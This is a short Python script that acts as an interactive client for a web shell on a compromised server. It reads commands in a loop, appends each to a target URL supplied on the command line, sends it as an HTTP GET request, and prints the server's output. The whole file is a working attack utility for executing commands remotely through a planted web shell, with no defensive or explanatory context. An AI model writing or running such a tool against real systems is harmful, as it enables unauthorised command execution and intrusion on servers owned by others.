# /usr/bin/env python3

import sys
import requests


def webshell(url):
    while True:
        cmd = input(">> ")
        if cmd == "exit":
            break

        if cmd:
            r = requests.get(url + cmd)
            print(r.text)


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("usage: {} URL".format(sys.argv[0]))
        sys.exit(1)

    webshell(sys.argv[1])
